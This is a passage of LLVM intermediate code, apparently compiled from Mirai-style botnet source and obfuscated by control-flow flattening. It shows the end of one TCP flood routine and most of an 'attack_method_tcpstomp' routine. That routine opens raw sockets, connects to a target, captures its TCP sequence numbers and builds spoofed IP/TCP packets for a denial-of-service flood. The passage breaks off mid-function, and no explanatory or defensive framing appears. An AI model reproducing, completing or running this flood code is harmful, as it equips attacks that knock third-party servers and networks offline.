  %383 = call i32 @rand_next()
  %384 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 2
  store i32 %383, i32* %385, align 4
  store i32 -1499915969, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = load i32, i32* %19, align 4
  %388 = icmp eq i32 %387, 65535
  %389 = select i1 %388, i32 -1133875996, i32 -2034980444
  store i32 %389, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = call i32 @rand_next()
  %392 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %393 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %392, i32 0, i32 3
  store i32 %391, i32* %393, align 4
  store i32 -2034980444, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = load i8, i8* %27, align 1
  %396 = icmp ne i8 %395, 0
  %397 = select i1 %396, i32 1661182342, i32 30867763
  store i32 %397, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i8*, i8** %35, align 8
  %400 = load i32, i32* %26, align 4
  call void @rand_str(i8* %399, i32 %400)
  store i32 30867763, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  %402 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %403 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %402, i32 0, i32 7
  store i16 0, i16* %403, align 2
  %404 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %405 = bitcast %struct.iphdr* %404 to i16*
  %406 = call zeroext i16 @checksum_generic(i16* %405, i32 20)
  %407 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 7
  store i16 %406, i16* %408, align 2
  %409 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %410 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %409, i32 0, i32 6
  store i16 0, i16* %410, align 4
  %411 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %412 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %413 = bitcast %struct.tcphdr* %412 to i8*
  %414 = load i32, i32* %26, align 4
  %415 = sext i32 %414 to i64
  %416 = add i64 20, %415
  %417 = trunc i64 %416 to i16
  %418 = call zeroext i16 @htons(i16 zeroext %417) #7
  %419 = load i32, i32* %26, align 4
  %420 = sext i32 %419 to i64
  %421 = add i64 20, %420
  %422 = trunc i64 %421 to i32
  %423 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %411, i8* %413, i16 zeroext %418, i32 %422)
  %424 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 6
  store i16 %423, i16* %425, align 4
  %426 = load %struct.tcphdr*, %struct.tcphdr** %34, align 8
  %427 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %426, i32 0, i32 1
  %428 = load i16, i16* %427, align 2
  %429 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %430 = load i32, i32* %9, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %429, i64 %431
  %433 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %432, i32 0, i32 0
  %434 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %433, i32 0, i32 1
  store i16 %428, i16* %434, align 2
  %435 = load i32, i32* %10, align 4
  %436 = load i8*, i8** %32, align 8
  %437 = load i32, i32* %26, align 4
  %438 = sext i32 %437 to i64
  %439 = add i64 40, %438
  %440 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %441 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %442 = load i32, i32* %9, align 4
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %441, i64 %443
  %445 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %444, i32 0, i32 0
  %446 = bitcast %struct.sockaddr_in* %445 to %struct.sockaddr*
  store %struct.sockaddr* %446, %struct.sockaddr** %440, align 8
  %447 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %448 = load %struct.sockaddr*, %struct.sockaddr** %447, align 8
  %449 = call i64 @sendto(i32 %435, i8* %436, i64 %439, i32 16384, %struct.sockaddr* %448, i32 16)
  store i32 1088974114, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  %451 = load i32, i32* %9, align 4
  %452 = add nsw i32 %451, 1
  store i32 %452, i32* %9, align 4
  store i32 -1542938346, i32* %switchVar
  br label %loopEnd

; <label>:453:                                    ; preds = %loopEntry
  store i32 1016369072, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %453, %450, %401, %398, %394, %390, %386, %382, %378, %372, %367, %361, %356, %350, %345, %341, %337, %316, %293, %287, %286, %285, %282, %279, %273, %178, %174, %126, %120, %119, %116, %110, %109, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 16) #6
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 %49, i64 8) #6
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 2, i32 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 -170437679, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -170437679, label %first
    i32 1139073997, label %106
    i32 1209483984, label %107
    i32 941254902, label %113
    i32 -497807550, label %116
    i32 1030230775, label %117
    i32 -1963305782, label %123
    i32 -1596954355, label %124
    i32 914658135, label %128
    i32 -1759939988, label %129
    i32 -1600777861, label %145
    i32 1498242777, label %166
    i32 -2119777199, label %175
    i32 1600217128, label %180
    i32 1285884448, label %185
    i32 -79781957, label %189
    i32 -1994253768, label %197
    i32 -750482796, label %209
    i32 -1889109551, label %210
    i32 -969498350, label %219
    i32 293220347, label %224
    i32 -1045847625, label %237
    i32 -472751001, label %246
    i32 -1710126264, label %255
    i32 839292732, label %347
    i32 821790110, label %351
    i32 -665902190, label %473
    i32 -529110717, label %482
    i32 -2013503910, label %491
    i32 -1929067011, label %494
    i32 1082864122, label %495
    i32 -549721651, label %496
    i32 -2117630366, label %497
    i32 -1469968066, label %503
    i32 -434804735, label %506
    i32 1275963823, label %507
    i32 -1210135771, label %508
    i32 50755644, label %511
    i32 1927460532, label %512
    i32 -1203624892, label %513
    i32 335070428, label %519
    i32 961280086, label %537
    i32 -564897156, label %543
    i32 -746464486, label %547
    i32 259532904, label %550
    i32 -2046271772, label %622
    i32 613166240, label %625
    i32 -211523271, label %626
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %104 = icmp eq i32 %.reload, -1
  %105 = select i1 %104, i32 1139073997, i32 1209483984
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  store i32 -211523271, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %108 = load i32, i32* %10, align 4
  %109 = bitcast i32* %9 to i8*
  %110 = call i32 @setsockopt(i32 %108, i32 0, i32 3, i8* %109, i32 4) #6
  %111 = icmp eq i32 %110, -1
  %112 = select i1 %111, i32 941254902, i32 -497807550
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i32, i32* %10, align 4
  %115 = call i32 @close(i32 %114)
  store i32 -211523271, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 1030230775, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* %9, align 4
  %119 = load i8, i8* %5, align 1
  %120 = zext i8 %119 to i32
  %121 = icmp slt i32 %118, %120
  %122 = select i1 %121, i32 -1963305782, i32 50755644
  store i32 %122, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  store i32 -1596954355, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %125, i32* %26, align 4
  %126 = icmp eq i32 %125, -1
  %127 = select i1 %126, i32 914658135, i32 -1759939988
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 -1210135771, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i32, i32* %26, align 4
  %131 = load i32, i32* %26, align 4
  %132 = call i32 (i32, i32, ...) @fcntl(i32 %131, i32 3, i32 0)
  %133 = or i32 %132, 2048
  %134 = call i32 (i32, i32, ...) @fcntl(i32 %130, i32 4, i32 %133)
  %135 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %135, align 4
  %136 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %137 = load i32, i32* %9, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %136, i64 %138
  %140 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %139, i32 0, i32 2
  %141 = load i8, i8* %140, align 4
  %142 = zext i8 %141 to i32
  %143 = icmp slt i32 %142, 32
  %144 = select i1 %143, i32 -1600777861, i32 1498242777
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %147 = load i32, i32* %9, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %146, i64 %148
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i32 0, i32 1
  %151 = load i32, i32* %150, align 4
  %152 = call i32 @ntohl(i32 %151) #7
  %153 = call i32 @rand_next()
  %154 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i32 0, i32 2
  %159 = load i8, i8* %158, align 4
  %160 = zext i8 %159 to i32
  %161 = lshr i32 %153, %160
  %162 = add i32 %152, %161
  %163 = call i32 @htonl(i32 %162) #7
  %164 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %165 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %164, i32 0, i32 0
  store i32 %163, i32* %165, align 4
  store i32 -2119777199, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %168 = load i32, i32* %9, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i64 %169
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i32 0, i32 1
  %172 = load i32, i32* %171, align 4
  %173 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %174 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %173, i32 0, i32 0
  store i32 %172, i32* %174, align 4
  store i32 -2119777199, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  %176 = load i16, i16* %17, align 2
  %177 = zext i16 %176 to i32
  %178 = icmp eq i32 %177, 65535
  %179 = select i1 %178, i32 1600217128, i32 1285884448
  store i32 %179, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  %181 = call i32 @rand_next()
  %182 = and i32 %181, 65535
  %183 = trunc i32 %182 to i16
  %184 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %183, i16* %184, align 2
  store i32 -79781957, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = load i16, i16* %17, align 2
  %187 = call zeroext i16 @htons(i16 zeroext %186) #7
  %188 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %187, i16* %188, align 2
  store i32 -79781957, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  %190 = load i32, i32* %26, align 4
  %191 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %192 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %192, %struct.sockaddr** %191, align 8
  %193 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %194 = load %struct.sockaddr*, %struct.sockaddr** %193, align 8
  %195 = call i32 @connect(i32 %190, %struct.sockaddr* %194, i32 16)
  %196 = call i64 @time(i64* null) #6
  store i64 %196, i64* %31, align 8
  store i32 -1994253768, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  store i32 16, i32* %29, align 4
  %198 = load i32, i32* %10, align 4
  %199 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %200 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %201 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %201, %struct.sockaddr** %200, align 8
  %202 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %203 = load %struct.sockaddr*, %struct.sockaddr** %202, align 8
  %204 = call i64 @recvfrom(i32 %198, i8* %199, i64 256, i32 16384, %struct.sockaddr* %203, i32* %29)
  %205 = trunc i64 %204 to i32
  store i32 %205, i32* %33, align 4
  %206 = load i32, i32* %33, align 4
  %207 = icmp eq i32 %206, -1
  %208 = select i1 %207, i32 -750482796, i32 -1889109551
  store i32 %208, i32* %switchVar
  br label %loopEnd

; <label>:209:                                    ; preds = %loopEntry
  store i32 -211523271, i32* %switchVar
  br label %loopEnd

; <label>:210:                                    ; preds = %loopEntry
  %211 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %212 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %211, i32 0, i32 0
  %213 = load i32, i32* %212, align 4
  %214 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %215 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %214, i32 0, i32 0
  %216 = load i32, i32* %215, align 4
  %217 = icmp eq i32 %213, %216
  %218 = select i1 %217, i32 -969498350, i32 -2117630366
  store i32 %218, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %33, align 4
  %221 = sext i32 %220 to i64
  %222 = icmp ugt i64 %221, 40
  %223 = select i1 %222, i32 293220347, i32 -2117630366
  store i32 %223, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %226 = getelementptr inbounds i8, i8* %225, i64 20
  %227 = bitcast i8* %226 to %struct.tcphdr*
  store %struct.tcphdr* %227, %struct.tcphdr** %35, align 8
  %228 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %229 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %228, i32 0, i32 0
  %230 = load i16, i16* %229, align 4
  %231 = zext i16 %230 to i32
  %232 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %233 = load i16, i16* %232, align 2
  %234 = zext i16 %233 to i32
  %235 = icmp eq i32 %231, %234
  %236 = select i1 %235, i32 -1045847625, i32 -549721651
  store i32 %236, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %239 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %238, i32 0, i32 4
  %240 = load i16, i16* %239, align 4
  %241 = lshr i16 %240, 9
  %242 = and i16 %241, 1
  %243 = zext i16 %242 to i32
  %244 = icmp ne i32 %243, 0
  %245 = select i1 %244, i32 -472751001, i32 -665902190
  store i32 %245, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 4
  %249 = load i16, i16* %248, align 4
  %250 = lshr i16 %249, 12
  %251 = and i16 %250, 1
  %252 = zext i16 %251 to i32
  %253 = icmp ne i32 %252, 0
  %254 = select i1 %253, i32 -1710126264, i32 -665902190
  store i32 %254, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %257 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %256, i32 0, i32 0
  %258 = load i32, i32* %257, align 4
  %259 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %260 = load i32, i32* %9, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %259, i64 %261
  %263 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %262, i32 0, i32 0
  store i32 %258, i32* %263, align 4
  %264 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %265 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %264, i32 0, i32 2
  %266 = load i32, i32* %265, align 4
  %267 = call i32 @ntohl(i32 %266) #7
  %268 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %269 = load i32, i32* %9, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %268, i64 %270
  %272 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %271, i32 0, i32 1
  store i32 %267, i32* %272, align 4
  %273 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %274 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %273, i32 0, i32 3
  %275 = load i32, i32* %274, align 4
  %276 = call i32 @ntohl(i32 %275) #7
  %277 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %278 = load i32, i32* %9, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %277, i64 %279
  %281 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %280, i32 0, i32 2
  store i32 %276, i32* %281, align 4
  %282 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %283 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %282, i32 0, i32 1
  %284 = load i16, i16* %283, align 2
  %285 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %286 = load i32, i32* %9, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %285, i64 %287
  %289 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %288, i32 0, i32 3
  store i16 %284, i16* %289, align 4
  %290 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %291 = load i16, i16* %290, align 2
  %292 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %293 = load i32, i32* %9, align 4
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %292, i64 %294
  %296 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %295, i32 0, i32 4
  store i16 %291, i16* %296, align 2
  %297 = load i32, i32* %24, align 4
  %298 = sext i32 %297 to i64
  %299 = add i64 40, %298
  %300 = call noalias i8* @malloc(i64 %299) #6
  %301 = load i8**, i8*** %12, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  store i8* %300, i8** %304, align 8
  %305 = load i8**, i8*** %12, align 8
  %306 = load i32, i32* %9, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds i8*, i8** %305, i64 %307
  %309 = load i8*, i8** %308, align 8
  %310 = bitcast i8* %309 to %struct.iphdr*
  store %struct.iphdr* %310, %struct.iphdr** %36, align 8
  %311 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i64 1
  %313 = bitcast %struct.iphdr* %312 to %struct.tcphdr*
  store %struct.tcphdr* %313, %struct.tcphdr** %37, align 8
  %314 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %315 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %314, i64 1
  %316 = bitcast %struct.tcphdr* %315 to i8*
  store i8* %316, i8** %38, align 8
  %317 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %318 = bitcast %struct.iphdr* %317 to i8*
  %319 = load i8, i8* %318, align 4
  %320 = and i8 %319, 15
  %321 = or i8 %320, 64
  store i8 %321, i8* %318, align 4
  %322 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %323 = bitcast %struct.iphdr* %322 to i8*
  %324 = load i8, i8* %323, align 4
  %325 = and i8 %324, -16
  %326 = or i8 %325, 5
  store i8 %326, i8* %323, align 4
  %327 = load i8, i8* %13, align 1
  %328 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 1
  store i8 %327, i8* %329, align 1
  %330 = load i32, i32* %24, align 4
  %331 = sext i32 %330 to i64
  %332 = add i64 40, %331
  %333 = trunc i64 %332 to i16
  %334 = call zeroext i16 @htons(i16 zeroext %333) #7
  %335 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 2
  store i16 %334, i16* %336, align 2
  %337 = load i16, i16* %14, align 2
  %338 = call zeroext i16 @htons(i16 zeroext %337) #7
  %339 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 3
  store i16 %338, i16* %340, align 4
  %341 = load i8, i8* %15, align 1
  %342 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 5
  store i8 %341, i8* %343, align 4
  %344 = load i8, i8* %16, align 1
  %345 = icmp ne i8 %344, 0
  %346 = select i1 %345, i32 839292732, i32 821790110
  store i32 %346, i32* %switchVar
  br label %loopEnd

; <label>:347:                                    ; preds = %loopEntry
  %348 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %349 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %350 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %349, i32 0, i32 4
  store i16 %348, i16* %350, align 2
  store i32 821790110, i32* %switchVar
  br label %loopEnd

; <label>:351:                                    ; preds = %loopEntry
  %352 = load %struct.iphdr*, %struct.iphdr** %36, align 8
